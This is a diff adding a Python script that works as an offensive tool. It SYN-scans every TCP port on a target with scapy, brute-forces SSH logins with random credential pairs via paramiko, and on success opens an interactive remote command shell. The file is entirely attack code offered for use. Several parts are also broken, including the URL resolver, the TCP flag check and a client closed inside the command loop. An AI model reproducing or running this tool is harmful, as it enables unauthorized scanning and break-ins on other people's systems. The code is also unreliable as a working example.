@@ -1,0 +1,169 @@
+import socket
+import paramiko
+from urllib.parse import urlparse
+import random
+import string
+from scapy.all import *
+from scapy.layers.inet import *
+import os
+import platform
+import time
+
+tcp_ports = []
+paramiko.util.log_to_file('paramiko.log')
+
+
+def resolve_url(url):
+    try:
+        if not urlparse(url).scheme:
+            url = 'http://' + url
+            parsed_url = urlparse(url)
+            hostname = parsed_url.hostname
+            ip_address = socket.gethostbyname(hostname)
+            return ip_address
+
+    except:
+        return None
+
+
+def ping(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((host, port))
+        s.close()
+        return True
+
+    except:
+        return False
+
+
+def tcp_scan(target):
+    ports = []
+    for port in range(1, 65536):
+        ports.append(port)
+
+    for port in ports:
+        scan = IP(dst=target) / TCP(dport=port, flags='S')
+        resp = sr1(scan, verbose=0, timeout=0.5)
+        print(resp)
+
+        if resp is not None:
+            if resp.haslayer(TCP) and resp.getlayer(TCP.flags) == 0x12:
+                tcp_ports.append(port)
+                send(IP(dst=target) / TCP(dport=port, flags='A'))
+                send(IP(dst=target) / TCP(dport=port, flags='R'))
+
+def scan_port(host, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(0.5)
+    result = s.connect_ex((host, port))
+    s.close()
+    return result == 0
+
+
+
+def ssh_brute_force(host, port):
+
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    min_lenght = 1
+    max_lenght = 16
+
+    usernames = []
+    passwords = []
+
+    for i in range(1000000):
+
+        username_lenght = random.randint(min_lenght, max_lenght)
+        password_lenght = random.randint(min_lenght, max_lenght)
+
+        username = ''.join(random.choice(string.ascii_letters +string.digits + string.punctuation) for i in range(username_lenght))
+        password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(password_lenght))
+
+        usernames.append(username)
+        passwords.append(password)
+
+
+    ip_address = host
+
+    for username, password in zip(usernames, passwords):
+        try:
+            ssh_client.connect(host, port, username, password, timeout=60)
+            print(f'Successful login - Username: {username}, Password: {password}')
+            print(f"IP address for {host}: {ip_address}")
+            print("Connection options:")
+            print(f"SSH: ssh {host}")
+            print(f"HTTP: http://{host}")
+            print(f"HTTPS: https://{host}")
+
+            while True:
+                command = input("Please enter your command right below (or type 'Exit' to quit):\n->")
+                if command.lower() == 'exit':
+                    print('Goodbye and thank you for using the machine!')
+                    time.sleep(2)
+                    os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+                    break
+
+                stdin, stdout, stderr = ssh_client.exec_command(command)
+                print(stdout.read().decode())
+                ssh_client.close()
+
+        except paramiko.AuthenticationException:
+            print(f'Failed login attempt - Username: {username}, Password: {password}')
+
+        except Exception as e:
+            print(f'An error occurred: {e}')
+
+        else:
+            print("Failed to list connection options.")
+
+    return False
+
+
+
+def main():
+
+    os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+    target_url = input("Enter the URL of the target: ")
+    target_port = 22
+    target_host = resolve_url(target_url)
+
+    if target_host:
+        print(f"Resolved IP address for {target_url}: {target_host}")
+
+        if ping(target_host,target_port):
+            print("Host is reachable, Performing a TCP Scan!")
+            time.sleep(2.5)
+            os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+            tcp_scan(target_url)
+
+            if scan_port(target_host, target_port):
+                time.sleep(2)
+                os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+                print("Port 22 (SSH) is open. Attempting SSH brute-force:\n")
+                if ssh_brute_force(target_host, target_port):
+                    print("SSH login successful.")
+
+                else:
+                    print("SSH login failed.")
+
+            else:
+                print("Port 22 (SSH) is closed.")
+                time.sleep(1)
+                os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+
+        else:
+            os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+            print("Host is unreachable.")
+            time.sleep(1)
+            os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+    else:
+        os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+        print("Failed to resolve URL.")
+        time.sleep(1)
+        os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+
+if __name__ == "__main__":
+    main()
